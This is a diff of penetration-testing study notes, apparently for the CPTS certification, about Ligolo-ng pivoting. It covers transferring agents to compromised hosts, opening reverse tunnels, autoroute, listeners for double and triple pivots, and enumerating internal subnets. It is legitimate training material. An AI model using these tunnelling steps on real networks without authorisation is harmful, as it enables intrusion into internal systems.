@@ -1,116 +1,22 @@
-# 🕸️ 1. Legolo NG — Pivoting & Multi-Pivoting
+# 🔗 1. Ligolo-ng Pivoting — Mental Model
 
-> [!info]  
-> **Pivoting** = using a compromised host as a stepping stone to reach a network your attack machine cannot directly access.
+> [!info] Core Idea  
+> **Pivoting** = use a compromised host as a bridge into networks that your attack machine cannot directly reach.
 > 
-> **Legolo NG** uses an **agent + proxy + TUN interface** to make internal networks reachable from Kali. Multi-pivoting repeats this process through multiple compromised hosts.
+> **Basic topology:**
+> 
+> ```text
+> Kali
+>   │
+>   │ Ligolo-ng tunnel
+>   ▼
+> Pivot / Compromised Host
+>   │
+>   └──► Internal Network
+>             └──► Internal Targets
+> ```
 
----
-
-# 🧠 2. Core Mental Model
-
-```text
-Kali
-  │
-  │ Legolo Tunnel
-  ▼
-Pivot 1
-  │
-  ▼
-Network 1
-  │
-  ▼
-Pivot 2
-  │
-  ▼
-Network 2
-  │
-  ▼
-Pivot 3
-  │
-  ▼
-Network 3
-```
-
-The CPTS thought process is:
-
-```text
-Compromise
-   ↓
-Enumerate interfaces/routes
-   ↓
-Find network Kali cannot reach
-   ↓
-Pivot through compromised host
-   ↓
-Add route
-   ↓
-Enumerate new network
-   ↓
-Compromise another host
-   ↓
-Pivot again
-```
-
----
-
-# 🔐 3. Single Pivot — Basic Setup
-
-## 3.1 Install / Obtain Legolo
-
-Options:
-
-```bash
-sudo apt install ligolo-ng
-```
-
-Or:
-
-- Compile from source.
-    
-- Download a precompiled release.
-    
-
-For the source's precompiled example:
-
-```bash
-gzip <file>.gz -d
-tar -xf <file>.tar
-```
-
----
-
-## 3.2 Start the Proxy
-
-```bash
-sudo ./proxy -selfcert
-```
-
-The proxy can enable its web UI:
-
-```text
-Web UI → 127.0.0.1:8080
-```
-
-The important agent listener is:
-
-```text
-TCP/11601
-```
-
-Mental model:
-
-```text
-Kali
- ├── Web UI → 8080
- └── Agent listener → 11601
-```
-
----
-
-# 🌐 4. Identify the Pivot
-
-Example:
+Typical situation:
 
 ```text
 Kali
@@ -119,76 +25,149 @@ Kali
       ▼
 Windows 10
 192.168.1.105
+169.254.62.20
       │
       ▼
 169.254.62.0/24
 ```
 
-Kali cannot initially reach:
+Kali can reach `192.168.1.0/24`, but initially:
 
 ```bash
 ping 169.254.62.20
 ```
 
-but the compromised Windows machine can.
+fails because Kali has no route to that network.
 
-Therefore Windows is a **pivot**.
+Ligolo-ng solves this by creating a **TUN interface and routes**, allowing normal tools such as `ping`, `nmap`, RDP, etc. to communicate with the internal network.
+
+---
+
+# 🛠️ 2. Ligolo-ng Components
+
+Ligolo-ng uses:
+
+|Component|Purpose|
+|---|---|
+|`proxy`|Runs on the attacker machine|
+|`agent`|Runs on the compromised machine|
+|TUN interface|Provides routing from Kali into the remote network|
+|Listener|Allows deeper pivots to connect through an existing pivot|
 
 > [!important]  
-> After every compromise, check the host's network interfaces:
-> 
-> Linux:
-> 
-> ```bash
-> ifconfig
-> ip addr
-> ip route
-> ```
-> 
-> Windows:
-> 
-> ```cmd
-> ipconfig
-> route print
-> ```
-> 
-> Look for networks the compromised host can reach that Kali cannot.
+> Ligolo-ng is a **reverse tunnel**. The compromised host initiates the connection back to the attacker's Ligolo-ng proxy.
+
+---
+
+# 📦 3. Obtaining Ligolo-ng
+
+Possible installation methods:
+
+```bash
+sudo apt install ligolo-ng
+```
+
+Or:
+
+- Compile from the official source.
+    
+- Download a precompiled release.
+    
+
+For engagements, reviewing the source and compiling your own binary can be preferable.
+
+Example release:
+
+```text
+Ligolo-ng proxy 0.8.2 Linux AMD64
+```
+
+Extract archives:
+
+```bash
+gzip <filename>.gz -d
+tar -xf <filename>.tar
+```
+
+---
+
+# 🖥️ 4. Start the Ligolo-ng Proxy
+
+On Kali:
+
+```bash
+sudo ./proxy -selfcert
+```
+
+The proxy uses a self-signed certificate.
+
+You may be asked whether to enable the web UI:
+
+```text
+Enable web UI? [Y/n]
+```
+
+Answer:
+
+```text
+Y
+```
+
+The web interface starts on:
+
+```text
+127.0.0.1:8080
+```
+
+The Ligolo-ng agent listener uses:
+
+```text
+11601
+```
 
 ---
 
 # 📥 5. Transfer the Agent
 
-Example HTTP server from Kali:
+Place `agent.exe` in a directory served by a Python HTTP server.
+
+Example:
 
 ```bash
 python3 -m http.server 80
 ```
 
-Then download `agent.exe` from the Windows host.
+On Windows, download the agent from the Kali machine.
 
-Other possible transfer tools:
+Terminal alternatives:
 
 ```bash
-curl
-wget
+curl ...
 ```
+
+```bash
+wget ...
+```
+
+> [!warning]  
+> Real Windows systems may have Defender/AV block known Ligolo-ng binaries. In CPTS labs this may not happen. In real engagements, binary execution and transfer must account for defensive controls.
 
 ---
 
 # 🔌 6. Connect the Agent
 
-Windows:
+On the compromised Windows host:
 
-```cmd
+```powershell
 .\agent.exe -connect 192.168.1.107:11601 -ignore-cert
 ```
 
-Important options:
+### Options
 
-```text
--connect <IP>:<PORT>   → Legolo proxy address
--ignore-cert            → Ignore self-signed certificate validation
-```
+|Option|Purpose|
+|---|---|
+|`-connect`|Connect to the Ligolo-ng proxy|
+|`-ignore-cert`|Ignore certificate validation because the proxy uses a self-signed certificate|
 
 Successful connection:
 
@@ -196,97 +175,86 @@ Successful connection:
 Connection established
 ```
 
-Then on the proxy:
+The proxy will show a new agent, for example:
+
+```text
+New agent joined
+Name: Win10 VM
+Connection from: 192.168.1.105:49978
+```
+
+---
+
+# 🎯 7. Enter the Agent Session
+
+Inside the Ligolo-ng proxy:
 
 ```text
 session
 ```
 
-Select the connected Windows agent.
+Select the appropriate session.
 
-To see available commands:
+Then:
 
 ```text
 help
 ```
 
+This shows available operations, including routing, listeners, and tunnel management.
+
 ---
 
-# 🛣️ 7. `autoroute` — IMPORTANT
+# 🚀 8. Autoroute — Preferred Method
 
-Inside the Legolo agent session:
+> [!success] CPTS Preferred Workflow  
+> For demonstrations and normal usage, use **`autoroute`** rather than manually creating TUN interfaces and adding routes.
+> 
+> The manual method is important to understand conceptually, but **do not use it as the demonstration workflow**.
+
+Inside the selected Ligolo-ng session:
 
 ```text
 autoroute
 ```
 
-This presents the routes/networks available through the compromised host.
+Ligolo-ng presents the networks/routes discovered through the compromised host.
 
-### Typical workflow shown in the video
+Typical interaction:
 
 ```text
-autoroute
-    ↓
-Select the internal network
-    ↓
-Press SPACE to select
-    ↓
-Press ENTER
+1. Select the internal network/route
+2. Use ↑ / ↓ to move between routes
+3. Press SPACE to select the desired route
+4. Press ENTER
+5. Choose/create the network interface for the tunnel
+6. Confirm starting the tunnel with Y
 ```
 
-For example, select:
+For the example:
 
 ```text
 169.254.62.0/24
 ```
 
-Do **not** select a network Kali already has direct access to unless there is a reason to route it through the pivot.
+is the important internal network.
 
-### Interface options
+The exact interface name may be automatically generated.
 
-After selecting the route, Legolo asks how to handle the route/interface. The important options shown are:
-
-```text
-Create a new interface
-```
-
-or use an:
-
-```text
-Existing interface
-```
-
-For the simple setup in the video, choose:
-
-```text
-Create a new interface
-```
-
-Legolo then creates the TUN interface and associates the selected route with it.
-
-The source's example interface name was:
-
-```text
-Frank Cognac
-```
-
-> [!tip]  
-> The strange-looking interface name is simply an automatically generated interface name. **Do not memorize the name.** Memorize the process:
+> [!important]  
+> Do **not** memorize a generated interface name from a video. The important concept is:
 > 
 > ```text
 > autoroute
-> → select network
-> → SPACE
-> → ENTER
-> → Create new interface
-> → start tunnel
+>    ↓
+> select internal route
+>    ↓
+> select/create TUN interface
+>    ↓
+> start tunnel
+>    ↓
+> Kali receives route to internal network
 > ```
-
----
-
-# 🚀 8. Start the Tunnel
-
-The resulting TUN interface allows Kali to route traffic through the Windows agent.
 
 Verify:
 
@@ -294,115 +262,162 @@ Verify:
 ifconfig
 ```
 
-Then test:
+Then:
 
 ```bash
 ping 169.254.62.20
 ```
 
-Before pivot:
+If successful, Kali can now communicate with the internal network normally.
 
-```text
-Kali ─────X────► 169.254.62.20
+You can then use:
+
+```bash
+nmap ...
 ```
 
-After pivot:
+or connect directly to services such as RDP:
 
 ```text
-Kali
- ↓
-TUN
- ↓
-Windows Pivot
- ↓
 169.254.62.20
 ```
 
-Check routing:
-
-```bash
-ip route
-```
-
 ---
 
-# 🔎 9. Enumerate the New Network
+# 🧠 9. Why Autoroute Is Better
 
-Once reachable:
-
-```bash
-nmap -sC -sV 169.254.62.0/24
-```
-
-The methodology is:
+Without Ligolo-ng:
 
 ```text
+Kali ──X──► 169.254.62.20
+```
+
+After `autoroute`:
+
+```text
+Kali
+ │
+ │ TUN interface
+ │
+ ▼
+Ligolo-ng tunnel
+ │
+ ▼
 Pivot
- ↓
-New Network
- ↓
-Nmap
- ↓
-Hosts / Ports / Services
- ↓
-Exploit or authenticate
- ↓
-New Foothold
+ │
+ ▼
+169.254.62.0/24
 ```
 
-The demonstration validates access by connecting to the internal Windows host using RDP.
+The major advantage is that applications on Kali behave as though the internal network were locally routed.
+
+You do **not** need:
+
+```text
+proxychains nmap ...
+proxychains nc ...
+proxychains xfreerdp ...
+```
+
+for every individual tool.
 
 ---
 
-# 🔁 10. Multi-Pivoting
+# 🔀 10. Multi-Pivoting — Mental Model
 
-Example topology:
+A compromised machine may itself have access to another network.
+
+Example:
 
 ```text
-Attack Box
-10.10.15.1
-     │
-     ▼
+Kali
+  │
+  ▼
 Pivot 1
-10.129.229.129
-172.16.5.15
-     │
-     ▼
+10.10.11.15
+  │
+  ▼
+172.16.5.0/24
+  │
+  ▼
 Pivot 2
 172.16.5.35
-172.16.6.35
-     │
-     ▼
+  │
+  ▼
+172.16.6.0/24
+  │
+  ▼
 Pivot 3
 172.16.6.25
-172.16.10.x
+  │
+  ▼
+172.16.10.0/24
 ```
 
-Each pivot exposes another network.
+> [!important] Key Methodology  
+> **Every newly compromised host should be checked for additional network interfaces and subnets.**
+> 
+> A compromised host is not necessarily the final target. It may be a **jump box into another network**.
 
 ---
 
-# 🛠️ 11. Pivot 1 — Manual TUN Setup
+# 🚀 11. Multi-Pivot Using Autoroute
 
-Create the first interface:
+The same `autoroute` concept should be used at **each pivot**.
 
-```bash
-sudo ip tuntap add user kali mode tun legolo
+You do **not** need to manually create TUN interfaces or manually add routes during the demonstration.
+
+The workflow becomes:
+
+```text
+Compromise Pivot 1
+        │
+        ▼
+Connect Agent 1
+        │
+        ▼
+autoroute
+        │
+        ▼
+Reach Network 1
+        │
+        ▼
+Find Pivot 2
+        │
+        ▼
+Connect Agent 2 through Pivot 1
+        │
+        ▼
+autoroute
+        │
+        ▼
+Reach Network 2
+        │
+        ▼
+Find Pivot 3
+        │
+        ▼
+Connect Agent 3 through Pivot 2
+        │
+        ▼
+autoroute
+        │
+        ▼
+Reach Network 3
 ```
 
-Bring it up:
+---
 
-```bash
-sudo ip link set legolo up
+# 🥇 12. Pivot 1 — Autoroute
+
+Example first foothold:
+
+```text
+Target: 10.129.229.129
+Internal interface: 172.16.5.15
 ```
 
-Check:
-
-```bash
-ifconfig
-```
-
-Start proxy:
+Start Ligolo-ng proxy on Kali:
 
 ```bash
 sudo ./proxy -selfcert
@@ -416,13 +431,13 @@ Make it executable:
 chmod +x <agent>
 ```
 
-Connect:
+Connect back to Kali:
 
 ```bash
-./<linux-agent> -connect <ATTACKER-IP>:11601 -ignore-cert
+./<linux-agent> -connect <KALI-IP>:11601 -ignore-cert
 ```
 
-Then:
+On the proxy:
 
 ```text
 session
@@ -430,117 +445,165 @@ session
 
 Select Pivot 1.
 
-Start the tunnel:
+Now use:
 
 ```text
-start --tun legolo
+autoroute
 ```
 
-Add route:
+Select:
 
-```bash
-sudo ip route add 172.16.5.0/24 dev legolo
+```text
+172.16.5.0/24
 ```
 
-Verify:
+Using:
+
+```text
+↑ / ↓
+SPACE
+ENTER
+```
+
+Choose/create the tunnel interface and confirm:
+
+```text
+Y
+```
+
+Now test:
 
 ```bash
-ip route
 ping 172.16.5.15
 ```
 
----
+Check routing:
 
-# 🔀 12. Pivot 2 — Double Pivot
+```bash
+ip route
+```
 
-Pivot 2:
+Then enumerate:
+
+```bash
+nmap ...
+```
+
+This reveals another host, for example:
 
 ```text
 172.16.5.35
-```
-
-has access to:
-
-```text
-172.16.6.0/24
-```
-
-Create another TUN interface:
-
-```bash
-sudo ip tuntap add user kali mode tun legolo-double
-```
-
-Bring it up:
-
-```bash
-sudo ip link set legolo-double up
+pivot server one
 ```
 
 ---
 
-## 🔌 12.1 Create Listener on Pivot 1
+# 🔁 13. Pivot 2 — Connecting Through Pivot 1
 
-In the **Pivot 1 Legolo session**:
+Pivot 2 has:
+
+```text
+172.16.5.35
+172.16.6.35
+```
+
+The important discovery is:
+
+```text
+Pivot 2
+   │
+   └──► 172.16.6.0/24
+```
+
+Kali cannot directly reach that network.
+
+First, on the **Pivot 1 Ligolo-ng session**, create a listener:
 
 ```text
 listener_add address 0.0.0.0:11601 to localhost:11601 tcp
 ```
 
-Check:
+Then verify:
 
 ```text
 listener_list
 ```
 
-Expected:
+The listener should show as online.
+
+### What the listener does
 
 ```text
-Status: online
+Pivot 2 Agent
+      │
+      │ connects to 172.16.5.15:11601
+      ▼
+Pivot 1 Listener
+      │
+      ▼
+localhost:11601
+      │
+      ▼
+Existing Ligolo-ng tunnel
+      │
+      ▼
+Kali Proxy
 ```
 
-Mental model:
-
-```text
-Pivot 2
-   ↓
-Pivot 1 :11601
-   ↓
-Existing Pivot 1 tunnel
-   ↓
-Kali / Legolo Proxy
-```
-
----
-
-## 📥 12.2 Connect Pivot 2 Agent
+This allows the second agent to reach the attacker's Ligolo-ng proxy **through Pivot 1**.
 
 Transfer the Windows agent to Pivot 2.
 
+On Pivot 2:
+
+```powershell
+dir
+```
+
 Then:
 
-```cmd
+```powershell
 .\agent.exe -connect 172.16.5.15:11601 -ignore-cert
 ```
 
-Back on the proxy:
+The proxy should now show a second agent.
+
+---
+
+# 🚀 14. Autoroute Pivot 2
+
+Inside the Ligolo-ng proxy:
 
 ```text
 session
 ```
 
-Select session 2.
+Select the **second pivot**.
 
-Start:
+Then:
 
 ```text
-start --tun legolo-double
+autoroute
 ```
 
-Add the new route:
+Select:
 
-```bash
-sudo ip route add 172.16.6.0/24 dev legolo-double
+```text
+172.16.6.0/24
+```
+
+Use:
+
+```text
+↑ / ↓
+SPACE
+ENTER
+```
+
+Choose/create the tunnel interface and confirm:
+
+```text
+Y
 ```
 
 Test:
@@ -549,45 +612,48 @@ Test:
 ping 172.16.6.35
 ```
 
-Check routes:
+Check:
 
 ```bash
 ip route
 ```
 
+Now Kali can reach:
+
+```text
+172.16.6.0/24
+```
+
 ---
 
-# 🔁 13. Pivot 3 — Triple Pivot
+# 🔁 15. Pivot 3 — Deeper Network
 
-Pivot 3:
+Suppose another host is discovered:
 
 ```text
 172.16.6.25
+pivot win10
 ```
 
-has access to:
+After compromising it through RDP, inspect its network configuration:
+
+```cmd
+ipconfig
+```
+
+Suppose it reveals:
 
 ```text
 172.16.10.0/24
 ```
 
-Create:
-
-```bash
-sudo ip tuntap add user kali mode tun legolo-triple
-```
-
-Bring it up:
-
-```bash
-sudo ip link set legolo-triple up
-```
+This means Pivot 3 provides another route deeper into the environment.
 
 ---
 
-## 🔌 13.1 Listener on Pivot 2
+# 🚀 16. Autoroute Pivot 3
 
-Switch to the Pivot 2 session and create:
+On the **Pivot 2 Ligolo-ng session**, create another listener:
 
 ```text
 listener_add address 0.0.0.0:11601 to localhost:11601 tcp
@@ -599,187 +665,302 @@ Verify:
 listener_list
 ```
 
----
-
-## 📥 13.2 Connect Pivot 3
-
 Transfer the Windows agent to Pivot 3.
 
-Connect it to Pivot 2:
+On Pivot 3:
 
-```cmd
+```powershell
 .\agent.exe -connect 172.16.6.35:11601 -ignore-cert
 ```
 
-Then:
+The third agent should appear in the Ligolo-ng proxy.
+
+Select it:
 
 ```text
 session
 ```
 
-Select Pivot 3.
-
-Start:
+Then:
 
 ```text
-start --tun legolo-triple
+autoroute
 ```
 
-Add the route:
+Select:
 
-```bash
-sudo ip route add 172.16.10.0/24 dev legolo-triple
+```text
+172.16.10.0/24
+```
+
+Use:
+
+```text
+↑ / ↓
+SPACE
+ENTER
+```
+
+Choose/create the tunnel interface and confirm:
+
+```text
+Y
 ```
 
 Test:
 
 ```bash
-ping <172.16.10.x>
+ping 172.16.10.x
 ```
+
+Check:
+
+```bash
+ip route
+```
+
+Kali can now access the third internal network.
 
 ---
 
-# 🧠 14. Multi-Pivot Formula
-
-Every additional pivot follows the same pattern:
+# 🗺️ 17. Complete Multi-Pivot Mental Model
 
 ```text
-1. Compromise new host
-        ↓
-2. Find its new network
-        ↓
-3. Create new TUN interface
-        ↓
-4. Create listener on previous pivot
-        ↓
-5. Transfer agent
-        ↓
-6. Agent connects to previous pivot
-        ↓
-7. Select new session
-        ↓
-8. Start tunnel
-        ↓
-9. Add route
-        ↓
-10. Test
-        ↓
-11. Enumerate
+                         ATTACKER
+                            │
+                            ▼
+                     ┌─────────────┐
+                     │    Kali     │
+                     │ Ligolo Proxy│
+                     └──────┬──────┘
+                            │
+                     Agent 1│
+                            ▼
+                     ┌─────────────┐
+                     │   Pivot 1   │
+                     │ 10.10.11.x  │
+                     └──────┬──────┘
+                            │
+                    172.16.5.0/24
+                            │
+                            ▼
+                     ┌─────────────┐
+                     │   Pivot 2   │
+                     │172.16.5.35  │
+                     └──────┬──────┘
+                            │
+                    172.16.6.0/24
+                            │
+                            ▼
+                     ┌─────────────┐
+                     │   Pivot 3   │
+                     │172.16.6.25  │
+                     └──────┬──────┘
+                            │
+                   172.16.10.0/24
+                            │
+                            ▼
+                     Deeper Targets
 ```
 
-Example:
+The repeated pattern is:
 
 ```text
-Network 1 → legolo
-Network 2 → legolo-double
-Network 3 → legolo-triple
+Find new network
+      ↓
+Find host with access to it
+      ↓
+Compromise host
+      ↓
+Connect new Ligolo-ng agent
+      ↓
+Create listener on previous pivot
+      ↓
+autoroute
+      ↓
+Reach new network
+      ↓
+Enumerate again
+      ↓
+Repeat
 ```
 
 ---
 
-# 📊 15. Command Cheat Sheet
+# 🧩 18. Manual Method — Understand It, Don't Use It in the Demo
 
-|Purpose|Command|
-|---|---|
-|Install|`sudo apt install ligolo-ng`|
-|Decompress|`gzip <file>.gz -d`|
-|Extract|`tar -xf <file>.tar`|
-|Start proxy|`sudo ./proxy -selfcert`|
-|HTTP file server|`python3 -m http.server 80`|
-|Linux interface|`sudo ip tuntap add user kali mode tun legolo`|
-|Enable interface|`sudo ip link set legolo up`|
-|Check interfaces|`ifconfig`|
-|Check IPs|`ip addr`|
-|Check routes|`ip route`|
-|Add route|`sudo ip route add 172.16.5.0/24 dev legolo`|
-|Create second TUN|`sudo ip tuntap add user kali mode tun legolo-double`|
-|Enable second TUN|`sudo ip link set legolo-double up`|
-|Second route|`sudo ip route add 172.16.6.0/24 dev legolo-double`|
-|Create third TUN|`sudo ip tuntap add user kali mode tun legolo-triple`|
-|Enable third TUN|`sudo ip link set legolo-triple up`|
-|Third route|`sudo ip route add 172.16.10.0/24 dev legolo-triple`|
-|Agent connection|`.\agent.exe -connect <IP>:11601 -ignore-cert`|
-|Linux agent|`./<agent> -connect <IP>:11601 -ignore-cert`|
-|Sessions|`session`|
-|Help|`help`|
-|Auto routing|`autoroute`|
-|Start tunnel|`start --tun <interface>`|
-|Add listener|`listener_add address 0.0.0.0:11601 to localhost:11601 tcp`|
-|List listeners|`listener_list`|
-|Ping|`ping <IP>`|
-|Nmap|`nmap -sC -sV <network>`|
+The **manual method** exists so you understand what `autoroute` is automating.
 
----
+Conceptually, you would manually:
 
-# ⚠️ 16. CPTS Accuracy Points
-
-> [!warning]  
-> **Do not confuse the concepts:**
-> 
-> ```text
-> TUN interface → where Kali sends traffic
-> Route         → tells Kali which traffic uses it
-> Agent         → runs on compromised host
-> Proxy         → runs on attack machine
-> Listener      → allows a deeper pivot to connect through the previous pivot
-> ```
+```text
+1. Create a TUN interface
+2. Bring the interface UP
+3. Start the Ligolo tunnel on that interface
+4. Add a route for the internal subnet
+5. Verify the route
+6. Test connectivity
+```
 
 > [!important]  
-> The most important multi-pivot concept:
+> You should understand this because `autoroute` is essentially automating the **TUN + route + tunnel setup**.
+> 
+> However, in these demonstrations, use:
 > 
 > ```text
-> Pivot 3
->    ↓
-> Pivot 2 Listener
->    ↓
-> Existing Tunnel
->    ↓
-> Pivot 1
->    ↓
-> Existing Tunnel
->    ↓
-> Kali / Proxy
+> autoroute
 > ```
 > 
-> The deeper the pivot, the more forwarding layers you create.
+> instead of manually creating interfaces and routes.
+
+This keeps the practical workflow consistent and avoids unnecessary manual setup.
 
 ---
 
-# 🎯 17. CPTS Mental Model
+# 🧠 19. CPTS Methodology — What to Look For
+
+When you compromise a host, immediately think:
 
 ```text
-🔎 COMPROMISE
-      ↓
-🌐 ENUMERATE INTERFACES
-      ↓
-🗺️ FIND HIDDEN NETWORK
-      ↓
-🕳️ CREATE TUNNEL
-      ↓
-🛣️ ADD ROUTE
-      ↓
-📡 TEST
-      ↓
-🔍 ENUMERATE NEW NETWORK
-      ↓
-🎯 COMPROMISE NEW HOST
-      ↓
-🔁 REPEAT
+┌──────────────────────────────┐
+│ I have compromised a host.   │
+└──────────────┬───────────────┘
+               ▼
+      Check network interfaces
+               │
+               ▼
+       Are there new subnets?
+          /            \
+        No              Yes
+        │                │
+        ▼                ▼
+ Continue         Set up Ligolo-ng
+ enumeration             │
+                         ▼
+                     autoroute
+                         │
+                         ▼
+                  Enumerate subnet
+                         │
+                         ▼
+                 Find next pivot
+                         │
+                         ▼
+                    Repeat
 ```
 
+> [!tip] The Critical Question  
+> Don't only ask:
+> 
+> **“What can I attack from this machine?”**
+> 
+> Also ask:
+> 
+> **“What network can this machine reach that I cannot?”**
+
+That second question is the foundation of multi-pivoting.
+
+---
+
+# 📌 20. Command Cheat Sheet
+
+### Proxy
+
+```bash
+sudo ./proxy -selfcert
+```
+
+### Linux Agent
+
+```bash
+chmod +x <agent>
+```
+
+```bash
+./<linux-agent> -connect <KALI-IP>:11601 -ignore-cert
+```
+
+### Windows Agent
+
+```powershell
+.\agent.exe -connect <KALI-IP>:11601 -ignore-cert
+```
+
+### Session
+
+```text
+session
+```
+
+### Help
+
+```text
+help
+```
+
+### Preferred Routing
+
+```text
+autoroute
+```
+
+### Listener for Next Pivot
+
+```text
+listener_add address 0.0.0.0:11601 to localhost:11601 tcp
+```
+
+### Listeners
+
+```text
+listener_list
+```
+
+### Verification
+
+```bash
+ifconfig
+```
+
+```bash
+ip route
+```
+
+```bash
+ping <internal-IP>
+```
+
+```bash
+nmap ...
+```
+
+---
+
+# 🎯 21. Final Mental Model
+
 > [!success]  
-> **Remember:** Pivoting is not about memorizing Legolo commands. The key is recognizing:
-> 
-> **"This host can reach a network that I cannot."**
-> 
-> Then build the path:
+> **Ligolo-ng turns compromised hosts into routed gateways.**
 > 
 > ```text
-> Agent → Tunnel → TUN → Route → Internal Network
+> Compromise
+>     ↓
+> Discover interfaces/subnets
+>     ↓
+> Connect Ligolo-ng agent
+>     ↓
+> autoroute
+>     ↓
+> Enumerate internal network
+>     ↓
+> Find another pivot
+>     ↓
+> Listener on previous pivot
+>     ↓
+> Connect next agent
+>     ↓
+> autoroute again
+>     ↓
+> Repeat deeper into the network
 > ```
 > 
-> For another pivot:
-> 
-> ```text
-> New Agent → Previous Pivot Listener → Existing Tunnel → Kali
-> ```
+> The **manual TUN/interface/route process is important knowledge**, but `autoroute` should be the normal practical workflow for these demonstrations.
